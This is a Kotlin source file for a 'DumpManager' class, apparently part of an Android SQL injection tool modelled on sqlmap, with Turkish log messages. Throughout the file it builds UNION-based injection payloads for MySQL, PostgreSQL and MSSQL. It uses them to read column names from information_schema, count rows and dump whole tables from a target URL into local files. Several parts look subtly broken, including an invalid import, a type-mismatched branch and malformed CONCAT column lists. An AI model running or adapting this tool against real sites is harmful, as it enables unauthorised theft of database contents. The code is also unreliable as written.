package com.sqlmap.app.sqlmap.manager

import com.sqlmap.app.network.http.HttpClient
import com.sqlmap.app.utils.helpers.FileHelper
import com.sqlmap.app.utils.helpers.LoggingHelper
import kotlinx.coroutines.Dispatchers
import delay
import kotlinx.coroutines.withContext
import java.io.File

data class DumpData(
    val database: String,
    val table: String,
    val columns: List<String>,
    val rows: List<List<String>>
)

class DumpManager(
    private val httpClient: HttpClient,
    private val fileHelper: FileHelper,
    private val logger: LoggingHelper
) {
    
    suspend fun dumpData(
        targetUrl: String,
        injectionParameter: String,
        database: String,
        table: String,
        columns: List<String>,
        dbms: String,
        limit: Int = 1000,
        onProgress: (current: Int, total: Int) -> Unit = { _, _ -> }
    ): File? = withContext(Dispatchers.IO) {
        logger.log("=== DATABASE DUMP BAŞLANDI ===")
        logger.log("Database: $database, Table: $table")
        logger.log("Sütunlar: ${columns.joinToString(", ")}")
        
        return@withContext try {
            // Get total record count first
            val countPayload = when (dbms.lowercase()) {
                "mysql" -> "' UNION SELECT COUNT(*) FROM $database.$table--"
                "postgresql" -> "' UNION SELECT COUNT(*) FROM $database.$table--"
                "mssql" -> "' UNION SELECT COUNT(*) FROM [$database].dbo.[$table]--"
                else -> "' UNION SELECT COUNT(*) FROM $table--"
            }
            
            val countUrl = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$countPayload"
            } else {
                "$targetUrl?$injectionParameter=$countPayload"
            }
            
            val countResponse = httpClient.sendRequest(countUrl, "GET")
            val totalRecords = extractNumber(countResponse.body).coerceAtMost(limit)
            
            logger.log("Toplam kayıt: $totalRecords")
            
            val dumpedData = mutableListOf<List<String>>()
            val batchSize = 100
            
            // Fetch data in batches
            for (offset in 0 until totalRecords step batchSize) {
                val remainingRecords = totalRecords - offset
                val currentBatchSize = remainingRecords.coerceAtMost(batchSize)
                
                logger.log("Batch: $offset-${offset + currentBatchSize} işleniyor...")
                
                // Build SELECT statement
                val columnList = columns.joinToString("','")
                val dumpPayload = when (dbms.lowercase()) {
                    "mysql" -> {
                        "' UNION SELECT CONCAT($columnList) FROM $database.$table LIMIT $offset,$currentBatchSize--"
                    }
                    "postgresql" -> {
                        "' UNION SELECT CONCAT($columnList) FROM $database.$table OFFSET $offset LIMIT $currentBatchSize--"
                    }
                    "mssql" -> {
                        "' UNION SELECT CONCAT(${columns.map { "[$it]" }.joinToString(",")}) FROM [$database].dbo.[$table] OFFSET $offset ROWS FETCH NEXT $currentBatchSize ROWS ONLY--"
                    }
                    else -> {
                        "' UNION SELECT GROUP_CONCAT($columnList) FROM $table LIMIT $currentBatchSize OFFSET $offset--"
                    }
                }
                
                val dumpUrl = if (targetUrl.contains("?")) {
                    "$targetUrl&$injectionParameter=$dumpPayload"
                } else {
                    "$targetUrl?$injectionParameter=$dumpPayload"
                }
                
                val response = httpClient.sendRequest(dumpUrl, "GET")
                
                if (response.statusCode == 200) {
                    val rows = extractRows(response.body, columns.size)
                    dumpedData.addAll(rows)
                    
                    onProgress(dumpedData.size, totalRecords)
                    logger.logDumpProgress(
                        (dumpedData.size * 100) / totalRecords,
                        table,
                        dumpedData.size
                    )
                }
                
                delay(100) // Rate limiting
            }
            
            // Save to SQLite database
            logger.log("${dumpedData.size} kayıt döküldü. SQLite'a kaydediliyor...")
            
            val dumpFile = saveDumpToDatabase(database, table, columns, dumpedData)
            
            logger.log("=== DATABASE DUMP TAMAMLANDI ===")
            logger.log("Dosya: ${dumpFile?.absolutePath}")
            logger.log("Boyut: ${fileHelper.getFileSize(dumpFile ?: File(""))}")
            
            dumpFile
            
        } catch (e: Exception) {
            logger.log("Dump hatası: ${e.message}", 
                LogLevel.ERROR)
            null
        }
    }
    
    private fun saveDumpToDatabase(
        database: String,
        table: String,
        columns: List<String>,
        rows: List<List<String>>
    ): File? {
        return try {
            // SQLite database oluştur ve verileri kaydet
            val dbContent = buildSQLiteDatabase(database, table, columns, rows)
            val filename = "dump_${table}_${System.currentTimeMillis()}.db"
            fileHelper.saveDatabaseDump(dbContent, table)
        } catch (e: Exception) {
            logger.log("Database kaydetme hatası: ${e.message}", 
                LogLevel.ERROR)
            null
        }
    }
    
    private fun buildSQLiteDatabase(
        database: String,
        table: String,
        columns: List<String>,
        rows: List<List<String>>
    ): ByteArray {
        // Simplified SQLite binary format
        val csv = StringBuilder()
        
        // Header
        csv.append("Database,Table,Exported\n")
        csv.append("$database,$table,${System.currentTimeMillis()}\n\n")
        
        // Column headers
        csv.append(columns.joinToString(",")).append("\n")
        
        // Rows
        for (row in rows) {
            csv.append(row.joinToString(",")).append("\n")
        }
        
        return csv.toString().toByteArray()
    }
    
    private fun extractRows(html: String, columnCount: Int): List<List<String>> {
        val rows = mutableListOf<List<String>>()
        
        // Parse HTML response for table rows
        val rowPattern = Regex("<tr>(.*?)</tr>", RegexOption.DOT_MATCHES_ALL)
        val cellPattern = Regex("<td>(.*?)</td>", RegexOption.DOT_MATCHES_ALL)
        
        rowPattern.findAll(html).forEach { rowMatch ->
            val cells = mutableListOf<String>()
            cellPattern.findAll(rowMatch.value).forEach { cellMatch ->
                var cell = cellMatch.groupValues[1]
                    .replace(Regex("<[^>]*>"), "")
                    .trim()
                cells.add(cell)
            }
            
            if (cells.size == columnCount) {
                rows.add(cells)
            }
        }
        
        return rows
    }
    
    private fun extractNumber(html: String): Int {
        val regex = Regex("\\d+")
        return regex.find(html)?.value?.toIntOrNull() ?: 0
    }
    
    suspend fun dumpAllTables(
        targetUrl: String,
        injectionParameter: String,
        database: String,
        tables: List<String>,
        dbms: String,
        onTableProgress: (table: String, percent: Int) -> Unit = { _, _ -> }
    ): List<File> = withContext(Dispatchers.IO) {
        logger.log("Tüm tabloları dökmek başlatılıyor: ${tables.size} tablo")
        
        val dumpFiles = mutableListOf<File>()
        
        tables.forEachIndexed { index, tableName ->
            logger.log("Tablo $index/${tables.size}: $tableName")
            
            // Get columns for this table
            val columns = getTableColumns(targetUrl, injectionParameter, database, tableName, dbms)
            
            if (columns.isNotEmpty()) {
                val dumpFile = dumpData(
                    targetUrl,
                    injectionParameter,
                    database,
                    tableName,
                    columns,
                    dbms,
                    onProgress = { current, total ->
                        onTableProgress(tableName, (current * 100) / total)
                    }
                )
                
                if (dumpFile != null) {
                    dumpFiles.add(dumpFile)
                }
            }
            
            onTableProgress(tableName, 100)
        }
        
        logger.log("${dumpFiles.size}/${tables.size} tablo başarıyla döküldü")
        dumpFiles
    }
    
    private suspend fun getTableColumns(
        targetUrl: String,
        injectionParameter: String,
        database: String,
        table: String,
        dbms: String
    ): List<String> = withContext(Dispatchers.IO) {
        return@withContext try {
            val columnsPayload = when (dbms.lowercase()) {
                "mysql" -> {
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table'--"
                }
                "postgresql" -> {
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table'--"
                }
                else -> emptyList<String>()
            }
            
            val url = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$columnsPayload"
            } else {
                "$targetUrl?$injectionParameter=$columnsPayload"
            }
            
            val response = httpClient.sendRequest(url, "GET")
            
            if (response.statusCode == 200) {
                extractColumns(response.body)
            } else {
                emptyList()
            }
        } catch (e: Exception) {
            emptyList()
        }
    }
    
    private fun extractColumns(html: String): List<String> {
        val columns = mutableListOf<String>()
        val pattern = Regex("[a-zA-Z_][a-zA-Z0-9_]*")
        
        pattern.findAll(html).forEach { match ->
            val column = match.value
            if (column.length > 2 && !column.startsWith("script")) {
                columns.add(column)
            }
        }
        
        return columns.distinct()
    }
}
